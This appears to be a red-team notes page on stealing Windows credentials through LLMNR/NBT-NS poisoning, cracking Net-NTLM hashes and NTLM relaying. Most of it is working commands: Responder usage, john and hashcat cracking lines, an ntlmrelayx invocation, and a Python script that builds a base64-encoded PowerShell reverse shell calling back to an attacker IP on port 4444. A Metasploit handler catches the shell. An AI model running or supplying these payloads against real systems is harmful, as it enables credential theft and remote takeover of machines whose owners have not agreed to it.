## LLMNR & NBT-NS Poisoning
- The victim wants to go to the print server at \\printserver, but mistakenly types in \\pintserver.
- The DNS server responds to the victim saying that it doesn’t know that host.
- The victim then asks if there is anyone on the local network that knows the location of \\pintserver.
- The attacker responds to the victim saying that it is the \\pintserver.
- The victim believes the attacker and sends its own username and NTLMv2 hash to the attacker.
- The attacker can now crack the hash to discover the password.

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/FindCredentials/Screen1.png?raw=true)

### Responder
```
git clone https://github.com/SpiderLabs/Responder
python Responder.py -I eth0 -wrf
```

## Network Windows Authentication Cracking
### NTLMv1 (Net-NTLMv1) Crack
```
john --format=netntlm hash.txt
hashcat -m 5500 -a 3 hash.txt
```

### NTLMv2 (Net-NTLMv2) Crack
```
john --format=netntlmv2 hash.txt
hashcat -m 5600 -a 3 hash.txt
```

## NTLM Relaying
- SMB Signing must be disabled, and this is the default setting except for the domain controllers.
- Relay the hashes to another machine.
- User must have admin access on this machine.

### Responder with SMB & HTTP Disabled (in Responder.conf)
![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/FindCredentials/Screen2.png?raw=true)
```
git clone https://github.com/SpiderLabs/Responder
python Responder.py -I eth0 -wrf
```

### Determine the machines that have SMB signing disabled
![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/FindCredentials/Screen3.png?raw=true)

### Powershell Reverse Encoded Shell
```
import base64
ip = '10.10.12.133' # your reverse shell ip
port = 4444 # your reverse shell port
payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
payload = payload % (ip, port)
cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
print cmdline
```

### Run ntlmrelayx.py script and pass to it the encoded reverse shell.
```
git clone https://github.com/SecureAuthCorp/impacket
python3 ntlmrelayx.py -smb2support -tf targets.txt -of result -debug -c 'powershell -e EnCoDeDShElL'
```

### Metasploit multi handler to receive the shell.
```
msfconsole
use exploit/multi/handler
set payload windows/shell/reverse_tcp
set lhost 10.0.2.15
set lport 4444
set ExitOnSession False
exploit -j
```

### Overall Process Overview
Machine 10.0.2.7 asks for an unknown host, then the attacker machine 10.0.2.15 responds to it with its own IP address, then machine 10.0.2.7 sends its credentials to the attacker machine 10.0.2.15 on port SMB, then the attacker machine takes these credentials and relays them to another machine 10.0.2.6, then machine 10.0.2.6 executed our reverse shell and the shell get back to us at 10.0.2.15.
![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/FindCredentials/Screen4.png?raw=true)
Stealing hashes from 10.0.2.7 and authenticate with them to 10.0.2.6
